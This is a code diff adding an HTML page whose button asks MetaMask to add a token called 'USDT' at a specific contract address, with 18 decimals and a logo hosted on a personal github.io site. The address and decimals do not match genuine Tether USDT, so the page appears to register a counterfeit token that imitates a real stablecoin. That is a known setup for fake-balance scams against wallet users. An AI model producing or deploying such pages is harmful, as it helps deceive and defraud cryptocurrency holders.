@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Add USDT Token</title>
+</head>
+<body>
+  <button onclick="addToken()">Add USDT Token to MetaMask</button>
+
+  <script>
+  async function addToken() {
+    try {
+      const wasAdded = await ethereum.request({
+        method: 'wallet_watchAsset',
+        params: {
+          type: 'ERC20',
+          options: {
+            address: '0x655142422C67D2921a1d291F29F06586aB95b80B',
+            symbol: 'USDT',
+            decimals: 18,
+            image: 'https://developernighty.github.io/usdt-token-logo/tether-usdt-logo.png'
+          },
+        },
+      });
+
+      if (wasAdded) {
+        alert('✅ Token added!');
+      } else {
+        alert('❌ Token not added.');
+      }
+    } catch (error) {
+      console.error(error);
+      alert('Error adding token.');
+    }
+  }
+  </script>
+</body>
+</html>
